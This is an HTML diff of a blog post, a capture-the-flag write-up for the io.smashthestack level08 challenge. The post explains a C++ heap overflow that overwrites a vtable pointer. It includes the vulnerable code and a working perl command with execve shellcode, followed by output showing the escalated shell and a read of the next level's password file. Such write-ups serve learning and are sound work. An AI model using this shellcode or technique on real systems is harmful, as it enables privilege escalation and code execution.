@@ -43,10 +43,10 @@
     <div class="sidebar-about">
       <h1>
         <a href="/">
-          Álvaro Felipe Melchor
+          Álvaro
         </a>
       </h1>
-      <p class="lead">Stuff about everything</p>
+      <p class="lead">Still learning</p>
     </div>
 
     <nav class="sidebar-nav">
@@ -111,135 +111,148 @@
       <div class="post">
   <h1 class="post-title">Level 08 I/O Smash the Stack</h1>
   <span class="post-date">09 Feb 2015</span>
-  <p>Finally I got some time to write. I am going to try to summarize the process which I have had to pass to resolve the smash&#39;s level08.</p>
+  <p>Finally I got some time to write. I am going to try to summarize the process which I have had to pass to resolve the smash’s level08.</p>
 
 <p>The code for this exercise is the following.</p>
-<div class="highlight"><pre><code class="language-C++" data-lang="C++"> <span class="c1">// writen by bla for io.smashthestack.org</span>
-<span class="cp">#include &lt;iostream&gt;</span>
-<span class="cp">#include &lt;cstring&gt;</span>
-<span class="cp">#include &lt;unistd.h&gt;</span>
 
-<span class="k">class</span> <span class="nc">Number</span>
-<span class="p">{</span>
-        <span class="k">public</span><span class="o">:</span>
-                <span class="n">Number</span><span class="p">(</span><span class="kt">int</span> <span class="n">x</span><span class="p">)</span> <span class="o">:</span> <span class="n">number</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="p">{}</span>
-                <span class="kt">void</span> <span class="n">setAnnotation</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">a</span><span class="p">)</span> <span class="p">{</span><span class="n">memcpy</span><span class="p">(</span><span class="n">annotation</span><span class="p">,</span> <span class="n">a</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">a</span><span class="p">));}</span>
-                <span class="k">virtual</span> <span class="kt">int</span> <span class="k">operator</span><span class="o">+</span><span class="p">(</span><span class="n">Number</span> <span class="o">&amp;</span><span class="n">r</span><span class="p">)</span> <span class="p">{</span><span class="k">return</span> <span class="n">number</span> <span class="o">+</span> <span class="n">r</span><span class="p">.</span><span class="n">number</span><span class="p">;}</span>
-        <span class="k">private</span><span class="o">:</span>
-                <span class="kt">char</span> <span class="n">annotation</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
-                <span class="kt">int</span> <span class="n">number</span><span class="p">;</span>
-<span class="p">};</span>
+<pre><code class="language-C++"> // writen by bla for io.smashthestack.org
+#include &lt;iostream&gt;
+#include &lt;cstring&gt;
+#include &lt;unistd.h&gt;
+
+class Number
+{
+        public:
+                Number(int x) : number(x) {}
+                void setAnnotation(char *a) {memcpy(annotation, a, strlen(a));}
+                virtual int operator+(Number &amp;r) {return number + r.number;}
+        private:
+                char annotation[100];
+                int number;
+};
 
 
-<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
-<span class="p">{</span>
-        <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">)</span> <span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+int main(int argc, char **argv)
+{
+        if(argc &lt; 2) _exit(1);
 
-        <span class="n">Number</span> <span class="o">*</span><span class="n">x</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Number</span><span class="p">(</span><span class="mi">5</span><span class="p">);</span>
-        <span class="n">Number</span> <span class="o">*</span><span class="n">y</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Number</span><span class="p">(</span><span class="mi">6</span><span class="p">);</span>
-        <span class="n">Number</span> <span class="o">&amp;</span><span class="n">five</span> <span class="o">=</span> <span class="o">*</span><span class="n">x</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">six</span> <span class="o">=</span> <span class="o">*</span><span class="n">y</span><span class="p">;</span>
+        Number *x = new Number(5);
+        Number *y = new Number(6);
+        Number &amp;five = *x, &amp;six = *y;
 
-        <span class="n">five</span><span class="p">.</span><span class="n">setAnnotation</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+        five.setAnnotation(argv[1]);
 
-        <span class="k">return</span> <span class="n">six</span> <span class="o">+</span> <span class="n">five</span><span class="p">;</span>
-<span class="p">}</span>
-</code></pre></div>
-<p>It is clear how the use of <code>memcpy</code> is insecure due to there is not sanitation on the argv[1] so we can write beyond the capacity of the member variable <code>annotation</code>.</p>
+        return six + five;
+}
+ 
+</code></pre>
+
+<p>It is clear how the use of <code class="highlighter-rouge">memcpy</code> is insecure due to there is not sanitation on the argv[1] so we can write beyond the capacity of the member variable <code class="highlighter-rouge">annotation</code>.</p>
 
 <p>To see if this fact is exploitable we need to figure out how is the layout of the class on memory. C++ classes are very similar with C’s structs. That means that the layout would be.</p>
-<div class="highlight"><pre><code class="language-text" data-lang="text">AAAAAAAAAAAAAAAAAAAANNNN
+
+<div class="highlighter-rouge"><pre class="highlight"><code>AAAAAAAAAAAAAAAAAAAANNNN
 
 where:
 A -&gt; bytes of annotation
 N -&gt; bytes of number
-</code></pre></div>
-<p>But in this case we have an extra pointer which is normally known as <code>vtable</code>. So the layout would be as follows.</p>
-<div class="highlight"><pre><code class="language-text" data-lang="text">PPPPAAAAAAAAAAAANNNN
+
+</code></pre>
+</div>
+
+<p>But in this case we have an extra pointer which is normally known as <code class="highlighter-rouge">vtable</code>. So the layout would be as follows.</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>PPPPAAAAAAAAAAAANNNN
 where:
 P-&gt; pointer of vtable
 A-&gt; bytes of annotation
 N-&gt; bytes of number
-</code></pre></div>
+</code></pre>
+</div>
+
 <p>What is the goal of vtable in C++? This can be viewed as dynamic binding since is the way C++ resolve calls when the inheritances come out. The following <a href="http://phrack.org/issues/56/8.html">example</a>  try to explain the concept.</p>
-<div class="highlight"><pre><code class="language-C++" data-lang="C++"><span class="cp">#include &lt;stdio.h&gt;</span>
-<span class="cp">#include &lt;string.h&gt;</span>
 
-<span class="k">class</span> <span class="nc">BaseClass</span>
-<span class="p">{</span>
-    <span class="k">private</span><span class="o">:</span>
-        <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
-    <span class="k">public</span><span class="o">:</span>
-        <span class="kt">void</span> <span class="n">SetBuffer</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">String</span><span class="p">)</span>
-        <span class="p">{</span>
-            <span class="n">strcpy</span><span class="p">(</span><span class="n">Buffer</span><span class="p">,</span><span class="n">String</span><span class="p">);</span>
-        <span class="p">}</span>
-        <span class="k">virtual</span> <span class="kt">void</span> <span class="n">PrintBuffer</span><span class="p">()</span>
-        <span class="p">{</span>
-            <span class="n">printf</span><span class="p">(</span><span class="err">“</span><span class="o">%</span><span class="n">s</span><span class="err">\</span><span class="n">n</span><span class="err">”</span><span class="p">,</span><span class="n">Buffer</span><span class="p">);</span>
-        <span class="p">}</span>
-<span class="p">};</span>
+<pre><code class="language-C++">#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
 
-<span class="k">class</span> <span class="nc">MyClass1</span><span class="o">:</span><span class="k">public</span> <span class="n">BaseClass</span>
-<span class="p">{</span>
-    <span class="k">public</span><span class="o">:</span>
-        <span class="kt">void</span> <span class="n">PrintBuffer</span><span class="p">()</span>
-        <span class="p">{</span>
-            <span class="n">printf</span><span class="p">(</span><span class="err">“</span><span class="nl">MyClass1</span><span class="p">:</span> <span class="err">“</span><span class="p">);</span>
-            <span class="n">BaseClass</span><span class="o">::</span><span class="n">PrintBuffer</span><span class="p">();</span>
-        <span class="p">}</span>
-<span class="p">};</span>
+class BaseClass
+{
+    private:
+        char buffer[32];
+    public:
+        void SetBuffer(char *String)
+        {
+            strcpy(Buffer,String);
+        }
+        virtual void PrintBuffer()
+        {
+            printf(“%s\n”,Buffer);
+        }
+};
 
-<span class="k">class</span> <span class="nc">MyClass2</span><span class="o">:</span><span class="k">public</span> <span class="n">BaseClass</span>
-<span class="p">{</span>
-    <span class="k">public</span><span class="o">:</span>
-        <span class="kt">void</span> <span class="n">PrintBuffer</span><span class="p">()</span>
-        <span class="p">{</span>
-            <span class="n">printf</span><span class="p">(</span><span class="err">“</span><span class="nl">MyClass2</span><span class="p">:</span> <span class="err">“</span><span class="p">);</span>
-            <span class="n">BaseClass</span><span class="o">::</span><span class="n">PrintBuffer</span><span class="p">();</span>
-        <span class="p">}</span>
-<span class="p">};</span>
+class MyClass1:public BaseClass
+{
+    public:
+        void PrintBuffer()
+        {
+            printf(“MyClass1: “);
+            BaseClass::PrintBuffer();
+        }
+};
 
-<span class="kt">void</span> <span class="nf">main</span><span class="p">()</span>
-<span class="p">{</span>
-    <span class="n">BaseClass</span> <span class="o">*</span><span class="n">Object</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
+class MyClass2:public BaseClass
+{
+    public:
+        void PrintBuffer()
+        {
+            printf(“MyClass2: “);
+            BaseClass::PrintBuffer();
+        }
+};
 
-    <span class="n">Object</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="k">new</span> <span class="n">MyClass1</span><span class="p">;</span>
-    <span class="n">Object</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="k">new</span> <span class="n">MyClass2</span><span class="p">;</span> 
+void main()
+{
+    BaseClass *Object[2];
 
-    <span class="n">Object</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">SetBuffer</span><span class="p">(</span><span class="err">“</span><span class="n">string1</span><span class="err">”</span><span class="p">);</span>
-    <span class="n">Object</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">SetBuffer</span><span class="p">(</span><span class="err">“</span><span class="n">string2</span><span class="err">”</span><span class="p">);</span>
-    <span class="n">Object</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">PrintBuffer</span><span class="p">();</span>
-    <span class="n">Object</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">PrintBuffer</span><span class="p">();</span>
-<span class="p">}</span>
+    Object[0] = new MyClass1;
+    Object[1] = new MyClass2; 
 
-<span class="err">$</span> <span class="p">.</span><span class="o">/</span><span class="n">example</span>
-<span class="nl">MyClass1</span><span class="p">:</span> <span class="n">string1</span>
-<span class="nl">MyClass2</span><span class="p">:</span> <span class="n">string2</span>
-</code></pre></div>
-<p>What’s going on here? Thanks to vtable the runtime can resolve which method should call. Vtable how we have said before has been created to support dynamic binding or dynamic dispatch. It is an array of functions. This functions will be set at runtime to point to the correct function to be called. That is why the Object[0] knows that when it needs to call the member function <code>PrintBuffer</code>, it must call the MyClass1’s function instead of BaseClass’s. The same happens with Object[1].</p>
+    Object[0]-&gt;SetBuffer(“string1”);
+    Object[1]-&gt;SetBuffer(“string2”);
+    Object[0]-&gt;PrintBuffer();
+    Object[1]-&gt;PrintBuffer();
+}
 
-<p>If in somehow we can overwrite the vtable we can hijack the flow of our program to execute arbitrary code. That is the problem of the code that we showed at the beginning. </p>
+$ ./example
+MyClass1: string1
+MyClass2: string2
+</code></pre>
 
-<p>When we call <code>setAnnotation</code> on <code>five</code>, which is a reference to <code>x</code>, we are able to write beyond its space since we are using memcpy without sanitation. We overwrite <code>six</code> memory space, since it is after the five’s memory; with the consequence to overwrite vtable. After that, when the statement <code>return six + five</code> is called, that in reality is called <code>return six.operator+(five)</code>, the runtime look through the <code>vtable</code> to know the correct function to call. This is when the buffer overflow; that happens on the heap since the classes are created using <code>new</code>, can be exploited.</p>
+<p>What’s going on here? Thanks to vtable the runtime can resolve which method should call. Vtable how we have said before has been created to support dynamic binding or dynamic dispatch. It is an array of functions. This functions will be set at runtime to point to the correct function to be called. That is why the Object[0] knows that when it needs to call the member function <code class="highlighter-rouge">PrintBuffer</code>, it must call the MyClass1’s function instead of BaseClass’s. The same happens with Object[1].</p>
+
+<p>If in somehow we can overwrite the vtable we can hijack the flow of our program to execute arbitrary code. That is the problem of the code that we showed at the beginning.</p>
+
+<p>When we call <code class="highlighter-rouge">setAnnotation</code> on <code class="highlighter-rouge">five</code>, which is a reference to <code class="highlighter-rouge">x</code>, we are able to write beyond its space since we are using memcpy without sanitation. We overwrite <code class="highlighter-rouge">six</code> memory space, since it is after the five’s memory; with the consequence to overwrite vtable. After that, when the statement <code class="highlighter-rouge">return six + five</code> is called, that in reality is called <code class="highlighter-rouge">return six.operator+(five)</code>, the runtime look through the <code class="highlighter-rouge">vtable</code> to know the correct function to call. This is when the buffer overflow; that happens on the heap since the classes are created using <code class="highlighter-rouge">new</code>, can be exploited.</p>
 
 <p>If we use gdb we can see the layout of the memory.</p>
 
-<p><img src="/public/images/level8-1.png" alt="level8-1"></p>
+<p><img src="/public/images/level8-1.png" alt="level8-1" /></p>
 
-<p>We have to write our shellcode in <code>annotation</code> and then rewrite the six’s vtable to redirect it to our shellcode. Finally to exploit this we need to execute the following.</p>
-<div class="highlight"><pre><code class="language-bash" data-lang="bash">/levels/level08 <span class="sb">`</span>perl -e ‘print “<span class="se">\x</span>10<span class="se">\x</span>a0<span class="se">\x</span>04<span class="se">\x</span>08<span class="se">\x</span>90<span class="se">\x</span>90<span class="se">\x</span>90<span class="se">\x</span>90<span class="se">\x</span>90<span class="se">\x</span>90<span class="se">\x</span>90<span class="se">\x</span>31<span class="se">\x</span>db<span class="se">\x</span>89<span class="se">\x</span>d8<span class="se">\x</span>b0<span class="se">\x</span>17<span class="se">\x</span>cd<span class="se">\x</span>80<span class="se">\x</span>31<span class="se">\x</span>db<span class="se">\x</span>89<span class="se">\x</span>d8<span class="se">\x</span>b0<span class="se">\x</span>2e<span class="se">\x</span>cd<span class="se">\x</span>80<span class="se">\x</span>31<span class="se">\x</span>c0<span class="se">\x</span>50<span class="se">\x</span>68<span class="se">\x</span>2f<span class="se">\x</span>2f<span class="se">\x</span>73<span class="se">\x</span>68<span class="se">\x</span>68<span class="se">\x</span>2f<span class="se">\x</span>62<span class="se">\x</span>69<span class="se">\x</span>6e<span class="se">\x</span>89<span class="se">\x</span>e3<span class="se">\x</span>50<span class="se">\x</span>53<span class="se">\x</span>89<span class="se">\x</span>e1<span class="se">\x</span>31<span class="se">\x</span>d2<span class="se">\x</span>b0<span class="se">\x</span>0b<span class="se">\x</span>cd<span class="se">\x</span>80”,”A”x56,”<span class="se">\x</span>0c<span class="se">\x</span>a0<span class="se">\x</span>04<span class="se">\x</span>08”’<span class="sb">`</span>
+<p>We have to write our shellcode in <code class="highlighter-rouge">annotation</code> and then rewrite the six’s vtable to redirect it to our shellcode. Finally to exploit this we need to execute the following.</p>
 
-sh-4.2<span class="nv">$ </span>id
+<div class="highlighter-rouge"><pre class="highlight"><code>/levels/level08 <span class="sb">`</span>perl -e ‘print “<span class="se">\x</span>10<span class="se">\x</span>a0<span class="se">\x</span>04<span class="se">\x</span>08<span class="se">\x</span>90<span class="se">\x</span>90<span class="se">\x</span>90<span class="se">\x</span>90<span class="se">\x</span>90<span class="se">\x</span>90<span class="se">\x</span>90<span class="se">\x</span>31<span class="se">\x</span>db<span class="se">\x</span>89<span class="se">\x</span>d8<span class="se">\x</span>b0<span class="se">\x</span>17<span class="se">\x</span><span class="nb">cd</span><span class="se">\x</span>80<span class="se">\x</span>31<span class="se">\x</span>db<span class="se">\x</span>89<span class="se">\x</span>d8<span class="se">\x</span>b0<span class="se">\x</span>2e<span class="se">\x</span><span class="nb">cd</span><span class="se">\x</span>80<span class="se">\x</span>31<span class="se">\x</span>c0<span class="se">\x</span>50<span class="se">\x</span>68<span class="se">\x</span>2f<span class="se">\x</span>2f<span class="se">\x</span>73<span class="se">\x</span>68<span class="se">\x</span>68<span class="se">\x</span>2f<span class="se">\x</span>62<span class="se">\x</span>69<span class="se">\x</span>6e<span class="se">\x</span>89<span class="se">\x</span>e3<span class="se">\x</span>50<span class="se">\x</span>53<span class="se">\x</span>89<span class="se">\x</span>e1<span class="se">\x</span>31<span class="se">\x</span>d2<span class="se">\x</span>b0<span class="se">\x</span>0b<span class="se">\x</span><span class="nb">cd</span><span class="se">\x</span>80”,”A”x56,”<span class="se">\x</span>0c<span class="se">\x</span>a0<span class="se">\x</span>04<span class="se">\x</span>08”’<span class="sb">`</span>
+
+<span class="gp">sh-4.2$ </span>id
 <span class="nv">uid</span><span class="o">=</span>1008<span class="o">(</span>level8<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1008<span class="o">(</span>level8<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>1009<span class="o">(</span>level9<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1009<span class="o">(</span>level9<span class="o">)</span>,1008<span class="o">(</span>level8<span class="o">)</span>,1029<span class="o">(</span>nosu<span class="o">)</span>
-sh-4.2<span class="nv">$ </span>cat /home/level9/.pass
+<span class="gp">sh-4.2$ </span>cat /home/level9/.pass
 XXXXXXXXXXX
-</code></pre></div>
+</code></pre>
+</div>
+
 <p>Write a shellcode is a difficult task in which I have to go deeper. This exercise has been very helpful to understand the danger of vtable on C++ and how the classes are represented in memory. We must be careful when we develop software since you never know where the danger resides.</p>
 
-<p>If you liked this post, you can
-<a href="https://twitter.com/intent/tweet/?url=http://alvarofe.github.io/posts/level08smash&text=Level 08 I/O Smash the Stack&via=alvaro_fe">share it with your followers</a>
-or
-<a href="https://twitter.com/alvaro_fe"> follow me on Twitter</a>!</p>
+<p>If you liked this post, you can <a href="https://twitter.com/intent/tweet/?url=http://alvarofe.github.io/posts/level08smash&amp;text=Level 08 I/O Smash the Stack&amp;via=alvaro_fe">share it with your followers</a> or <a href="https://twitter.com/alvaro_fe"> follow me on Twitter</a>!</p>
+
 
 </div>
 
